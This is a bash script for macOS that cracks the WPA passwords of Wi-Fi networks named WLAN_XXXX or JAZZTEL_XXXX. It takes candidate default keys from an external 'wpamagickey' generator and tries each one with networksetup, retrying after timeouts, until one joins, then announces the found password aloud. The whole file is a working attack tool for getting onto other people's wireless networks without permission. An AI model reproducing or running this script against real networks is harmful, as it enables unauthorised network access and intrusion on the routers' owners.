#!/bin/bash

case $# in
	2)
		essid=$1
		bssid=$2
		echo "$essid" | tr '[:upper:]' '[:lower:]' | grep -q '^\(wlan\|jazztel\)_[a-f0-9]\{4\}$'
		if [ $? -ne 0 ]
		then
			echo -e "\tessid not valid, examples: WLAN_0A2B, JAZZTEL_B89F.."
			exit 1
		fi
		echo "$bssid" | tr '[:upper:]' '[:lower:]' | grep -q '^[a-f0-9]\{2\}\(:[a-f0-9]\{2\}\)\{5\}$'
		if [ $? -ne 0 ]
		then
			echo -e "\tbssid not valid, example: aa:bb:cc:00:11:a0"
			exit 1
		fi
		;;
	*)
		echo -e "\n$0 <essid> <bssid>"
		exit 1
		;;
esac


pass_found_sw=0
timeout_retries_max=20
network_retries_max=8
pass_candidates=$(./wpamagickey $essid $bssid | grep '^[a-f0-9]\{20\}$' | sort -r)
if [ $? -ne 0 ]
then
	#echo -e "\twpamagickey didn't like the input."
	exit 2
fi
candidates_num=$(echo $pass_candidates | wc -w)
if [ $candidates_num -eq 1 ]
then
	echo -e "\tJust one password candidate: $pass_candidates"
else
	echo -e "\tNumber of password candidates: $candidates_num"
fi
for password in $pass_candidates
do
	echo -n "."
	timeout_tries=$timeout_retries_max
	network_tries=$network_retries_max
	while true
	do
		result=$(networksetup -setairportnetwork en0 $essid $password)
		echo "$result" | grep -q 'Timeout error'
		if [ $? -eq 0 ]
		then
			txt1="Timeout error, retrying..."
			echo -e "\n$txt1"	
			timeout_tries=$((timeout_tries-1))
			if [ $timeout_tries -le 0 ]
			then
				txt="Too many timeouts, aborting."
				echo "$txt"
				say "$txt"
				exit 2
			fi
		else
			timeout_tries=$timeout_retries_max
			echo "$result" | grep -q 'Could not find network'
			if [ $? -eq 0 ]
			then
				txt="The network $essid is not reachable."
				echo -e "\n$txt"
				network_tries=$((network_tries-1))	
				if [ $network_tries -le 0 ]
				then
					say "$txt"
					txt1="Aborting"
					say $txt1
					echo $txt1
					exit 2
				fi
			else
				network_tries=$network_retries_max
				break
			fi
		fi	
	done
	echo "$result" | grep -q 'Invalid PMK\|Failed to join'
	if [ $? -ne 0 ]
	then
		pass_found_sw=1
		txt="Password found: $password"
		echo -e "\n\t$txt"
		say $txt
		break
	fi
done
if [ $pass_found_sw -eq 0 ]
then
	txt='Sorry, no password found.'
	echo $txt
	say $txt
fi
